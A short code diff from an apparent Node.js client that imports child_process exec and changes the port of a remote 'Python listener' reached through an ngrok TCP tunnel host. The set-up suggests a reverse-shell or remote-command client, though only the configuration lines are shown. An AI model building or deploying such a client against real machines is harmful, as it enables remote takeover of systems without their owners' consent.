@@ -4,7 +4,7 @@ const { exec } = require('child_process');
 
 // Server configuration
 const HOST = '4.tcp.eu.ngrok.io';  // Python listener's IP address
-const PORT = 1234;         // Python listener's port
+const PORT = 18108;         // Python listener's port
 const LOG_FILE = 'client.log';
 
 // Connect to Python server
